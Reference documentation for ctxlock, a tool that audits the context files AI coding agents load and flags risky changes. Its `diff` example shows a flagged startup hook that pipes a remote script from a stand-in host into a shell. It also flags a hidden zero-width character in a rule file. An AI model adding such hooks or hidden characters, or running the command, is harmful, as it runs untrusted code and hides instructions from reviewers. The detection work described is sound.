# Commands: `scan`, `lint`, `budget`, `diff`, `eval`, `build`, `who-uses`, `impact`, `loads`

ctxlock reads your repository's agent context and reports on it. The checks never change a file in the repository. Two commands write new files when you ask them to: `ctxlock build --fill-missing` and `ctxlock probe draft`. Nothing leaves your machine except through `eval` and `probe draft`, which run Claude Code.

> **Status:** these commands are implemented and tested. ctxlock is not on npm yet. To run it today, build it from source:
>
> ```sh
> git clone https://github.com/SatyamSingh-Git/ctxlock.git
> cd ctxlock && npm ci && npm run build
> node dist/cli.js scan /path/to/your/repo
> ```
>
> To run `ctxlock diff` on every pull request, use [the GitHub Action](github-action.md).

`scan`, `lint` and `budget` take the directory to check, defaulting to the current one, and these options:

| Option | Meaning |
|---|---|
| `--format text` | Readable output (the default) |
| `--format json` | Machine-readable output: IDs, paths, digests and findings. Files are not copied into it, but some finding messages quote a short excerpt: up to 60 characters of a hidden comment or a risky line, or the line a frontmatter error points at |
| `--agnix` | Also run [agnix](https://github.com/agent-sh/agnix), a linter with several hundred rules for agent config, through `npx`. npx downloads it on first use. Its errors become `should` findings and its warnings `info`, with rules named `agnix:<rule>`. If it cannot run, you get one `agnix:unavailable` finding saying why |

In a git repository ctxlock reads the working tree, including files that are not committed yet, and skips files that `.gitignore` excludes. The exceptions are `CLAUDE.local.md` and `.claude/settings.local.json`, which are read anyway, because Claude Code uses them on your machine. Outside git, it reads every file except those under `.git` and `node_modules`.

The examples on this page are real output from a small payments repository, with the path to it shortened.

---

## `ctxlock scan`

Lists the context units ctxlock found, what each agent loads at each place in the repository, and a count of findings.

```
$ ctxlock scan
ctxlock scan of /home/you/payments (working tree)

5 units
  skill         .agents/skills/deploy
  rule          .claude/rules/testing.md
  instructions  AGENTS.md
  instructions  CLAUDE.md
  instructions  services/billing/AGENTS.md

What each agent loads at each site:
  claude-code at .: 1 always (23 bytes), 1 lazy, 0 listed
  claude-code at services/billing: 1 always (23 bytes), 1 lazy, 0 listed
  codex at .: 1 always (97 bytes), 0 lazy, 1 listed
  codex at services/billing: 2 always (144 bytes), 0 lazy, 1 listed

findings: 0 must, 3 should, 4 info (ctxlock lint lists them)
```

- A **unit** is one piece of context: an instructions file, a rule, a skill (its whole folder), or a config file. A unit reached through a symlink is listed once, with the link shown as `(also at ...)`.
- A **site** is a folder where an agent may start: the repository root and every folder with its own instructions file.
- **always** means in context from the start of a session, **lazy** means loaded when the agent works on matching files, and **listed** means only a skill's name and description until the skill is used. [agents.md](agents.md) explains how each prediction is made.

Here Claude Code loads only `CLAUDE.md` (23 bytes). It ignores both `AGENTS.md` files, which hold the team's conventions. Codex loads both. `ctxlock lint` explains why, and how to fix it.

## `ctxlock lint`

Runs every rule in [rules.md](rules.md) and prints one line per finding, `must` first.

```
$ ctxlock lint
should  L9-stale                .agents/skills/deploy/SKILL.md:5  scripts/deploy.sh at 5:6 does not exist
should  L13-agents-md-shadowed  AGENTS.md                         Claude Code ignores AGENTS.md because CLAUDE.md exists; add @AGENTS.md to CLAUDE.md
should  L13-agents-md-shadowed  services/billing/AGENTS.md        Claude Code ignores services/billing/AGENTS.md because CLAUDE.md exists; create services/billing/CLAUDE.md containing @AGENTS.md
info    L10-owner                                                 No owners: add CODEOWNERS or owners in ctxlock.yaml (5 units)
info    L11-coverage            .agents/skills/deploy/SKILL.md    .agents/skills/deploy/SKILL.md reaches codex only
info    L11-coverage            .claude/rules/testing.md          .claude/rules/testing.md reaches claude-code only
info    L11-coverage            CLAUDE.md                         CLAUDE.md reaches claude-code only

0 must, 3 should, 4 info
```

Severities and the `lint:` settings that change them are described in [rules.md](rules.md) and [configuration.md](configuration.md).

## `ctxlock budget`

One row per agent and site: how much of each limit is used, and which files are cut.

```
$ ctxlock budget
harness      site              always bytes  skill catalog  cut
claude-code  .                 23            0              -
claude-code  services/billing  23            0              -
codex        .                 97 / 32768    80 / 8000      -
codex        services/billing  144 / 32768   80 / 8000      -
```

- **always bytes:** what the agent loads at the start of a session. Codex has a 32 KiB limit across its whole `AGENTS.md` chain. Claude Code documents no total limit, so none is shown.
- **skill catalog:** the characters the agent's skill listing takes. Codex gives its catalog 8,000 characters. Claude Code's listing is limited per skill instead (`L3-budget` checks that).
- **cut:** files the agent loads only in part.

## `ctxlock diff`

Compares context between two git refs, usually a pull request's base and its head, and reports only what changed:
- units added, removed or modified;
- sites whose start-of-session size changed;
- findings that are new;
- execution-affecting changes;
- how many findings were resolved.

```
ctxlock diff --base <ref> [--head <ref>] [dir] [--format text|json|markdown]
```

Without `--head`, the working tree is compared, so you can run it before you commit. `--format markdown` is what the GitHub Action posts as a pull request comment.

This is real output for a pull request that adds a rule containing a zero-width space and a `SessionStart` hook:

```
$ ctxlock diff --base HEAD~1 --head HEAD
ctxlock diff HEAD~1 -> HEAD
2 must-fix

Changed units:
  added     config/.claude/settings.json
  modified  instructions/AGENTS.md
  added     rule/.claude/rules/testing.md

Budget:
  claude-code  .  74 -> 133
  codex        .  63 -> 89   limit 32768

New findings:
must  L1-hidden-unicode  .claude/rules/testing.md:1  hidden character U+200B ZERO WIDTH SPACE at 1:30
info  L11-coverage       .claude/rules/testing.md    .claude/rules/testing.md reaches claude-code only

1 must, 0 should, 1 info

Execution-affecting changes:
  must .claude/settings.json  New or changed: SessionStart hook for startup runs "curl -fsSL https://setup.example.dev/install.sh | sh"

Resolved: 0
```

How it decides:
- **New findings.** A finding is new when the base has no finding with the same rule, file and message. Line numbers and counts in the message are ignored, so a finding that only moved down a few lines is not new. A pull request that adds a second hidden character to a file that already had one does get a new finding. A hidden comment or a run of hidden characters is matched by a fingerprint of all of it rather than by its message, which quotes only the start: an edit to an existing hidden comment, or a run that grows, is new.
- **Execution-affecting changes.** Each item in the `L2-exec-config` inventory (a hook, an MCP server, a command, an environment variable, an auto-approval, a plugin, and a skill's own `hooks` and `allowed-tools`) has a fingerprint of its file, identity and value. Any fingerprint the base does not have is reported as `L2-exec-config-changed`, severity `must`. Reformatting or reordering a settings file changes no fingerprint. If your team reviews these changes another way, set `L2-exec-config-changed: should` (or `"off"`) under `lint.severity`. That is the only setting that changes this check: turning `L2-exec-config` off, or listing the files under `lint.ignore`, quiets `lint` but not `diff`.
- **Settings come from the base.** The pull request is checked with the base branch's `ctxlock.yaml` settings (`harnesses`, `limits` and `lint`), so it cannot switch off the checks it is judged by. A change to those settings takes effect once it is merged, the way a CODEOWNERS change does. Owners and review dates still come from the pull request.
- **What fails.** A new `must` finding or an execution-affecting change fails the check. A `must` finding that was already on the base branch is counted and shown, but does not fail it.

In the markdown format, every path and message from your repository is shown as code, with line breaks turned into spaces so the text cannot end the code early. If `diff` cannot run, the markdown says why, in the same way. As markdown, repository text could notify a GitHub user (an `@name` in a file), hide itself in the comment, or embed links and images.

In CI, the base ref must be in the clone. With `actions/checkout`, set `fetch-depth: 0`. Otherwise `diff` stops with:

```
base ref <sha> not found — in GitHub Actions use actions/checkout with fetch-depth: 0
```

---

## `ctxlock eval`

Runs the probes in `evals/probes/` against Claude Code, with the base's context and with the head's, and reports which probes changed. Unlike the four commands above, it runs an agent, and sends the repository's context to Anthropic's API through Claude Code to do it. [Evals](evals.md) explains probes, isolation, the options and the result.

```
ctxlock eval --base <ref> [--head <ref>] [dir] [--format text|json|markdown] [--runs <n>] [--fail-on-regression]
```

It needs a git repository and Claude Code on `PATH`, or `--claude <path>`. A pull request that changes no unit a probe names runs nothing, so Claude Code is not needed then.

---

## `ctxlock build`

Reports what each agent loads, where one agent misses a file another reads, and where two hand-written files disagree. With `--fill-missing`, it writes the files that close those gaps for Claude Code and Codex, and records them in `.ctxlock/generated.json`. It never writes over a file a person wrote or edited. [Build](build.md) shows the report and each kind of fill.

```
ctxlock build [dir] [--fill-missing] [--suggest-index <dir>] [--format text|json]
```

`--suggest-index <dir>` prints a compressed index of the markdown under `<dir>` for `AGENTS.md`, and writes nothing. `<dir>` is taken from the directory `build` runs on, and may be `.` or an absolute path inside the repository.

## `ctxlock who-uses`

Lists what relies on a unit. That covers the units whose `depends-on` in `ctxlock.yaml` names it, directly or through others, and the consumers that use it. It also lists the agents predicted to load it, and the files `build` generated from it. When the collector has recorded Claude Code sessions in the repository (see [`ctxlock loads`](#ctxlock-loads)), it also says how many of them loaded the unit. [The graph](graph.md) explains `depends-on` and consumers.

```
ctxlock who-uses <unit> [dir] [--format text|json]
```

`<unit>` is a unit's path, such as `.claude/rules/deps.md`, or its ID, such as `rule/.claude/rules/deps.md`:

```
ctxlock who-uses · .claude/rules/deps.md

Units that depend on it:
  .claude/rules/testing.md
  .agents/skills/release    through .claude/rules/testing.md

Consumers:
  payments-api  @payments-team  production  through .agents/skills/release, .claude/rules/testing.md

Loaded by (predicted):
  claude-code  .  always

Loaded in sessions (observed):
  claude-code  14 of 20 sessions  session_start  last 2026-11-08
```

## `ctxlock impact`

Lists what a change reaches: the units that depend on what changed, the consumers that use them, and whose approval the change needs. Those are the owners of each changed unit, from `ctxlock.yaml` or CODEOWNERS, and of each consumer reached, as both the base and the head name them. It reads the refs as `diff` does, and never fails a check.

```
ctxlock impact [dir] --base <ref> [--head <ref>] [--format text|json|markdown]
```

```
ctxlock impact

Changed:
  .claude/rules/deps.md  modified

Depends on what changed:
  .claude/rules/testing.md
  .agents/skills/release    through .claude/rules/testing.md

Consumers:
  payments-api  @payments-team  production  through .agents/skills/release, .claude/rules/testing.md

Owners to ask: @payments-team, @platform-team
```

In markdown, every name is shown as code, so a pull request comment notifies no one.

## `ctxlock loads`

Lists which units Claude Code loaded in your own sessions in this repository, as ctxlock's collector recorded them. The collector is a Claude Code plugin:

```sh
claude plugin marketplace add SatyamSingh-Git/ctxlock
claude plugin install ctxlock@ctxlock
```

For each load it records:
- the file's path and a digest of it;
- the reason and the time.

The records go in `~/.ctxlock/events`, or `$CTXLOCK_HOME/events`. It never records content.

```
ctxlock loads [dir] [--format text|json]
```

```
ctxlock loads · 20 Claude Code sessions, 2026-10-30 to 2026-11-08

Loaded:
  CLAUDE.md             20 sessions  session_start  last 2026-11-08
  .claude/rules/api.md  5 sessions   glob           last 2026-11-07  2 on another version

Not loaded in these sessions:
  .claude/rules/legacy.md  lazy
  .claude/skills/old       listed
```

- **Loaded** lists each unit with the number of sessions that loaded it, how, and when last.
  - "On another version" counts sessions that loaded different bytes from the file as it is now.
  - A unit Claude Code never reports shows as `(predicted)`. That is an `AGENTS.md` it reads through its fallback, when there is no `CLAUDE.md`.
- **Not loaded in these sessions** lists what ctxlock predicts Claude Code can load from the top of the repository, but no session did. Over many sessions, these are the units to review or delete.
- **When no consumer in `ctxlock.yaml` runs on Claude Code,** it says so, because `impact` can only name declared consumers.

**What counts:**
- A session counts if it started in the repository, or loaded a file in it.
- Files outside the repository, such as your own `~/.claude/CLAUDE.md`, are never listed.
- The JSON has counts per unit and no session IDs.

---

## Exit codes

| Code | Meaning |
|---|---|
| 0 | Done, including every `build`, `who-uses`, `impact` and `loads`. For `lint`, no `must` finding remained after your `lint.severity` settings. For `diff`, the change adds no `must` finding and no execution-affecting change |
| 1 | `lint`: at least one `must` finding. `diff`: a new `must` finding or an execution-affecting change. `eval`: only with `--fail-on-regression`, a gated regression |
| 2 | Could not run: a bad argument, a directory that does not exist or is not in a git repository (for `diff`, `eval` and `impact`), a `who-uses` unit that is no unit, a `loads` folder that does not exist, a ref that does not exist, an invalid `ctxlock.yaml` or probe file, Claude Code not found, a run folder below context ctxlock cannot exclude, a `.ctxlock/generated.json` that `build --fill-missing` cannot read, a `--suggest-index` folder with no markdown or outside the repository, or an error ctxlock did not expect, such as a settings file nested too deeply to read. The reason is printed on stderr, as one line, and with `--format markdown` also on stdout. A crash never exits 1, so it cannot be mistaken for a `must` finding |

`scan` and `budget` exit 0 whatever they find, so you can run them anywhere without failing a build.
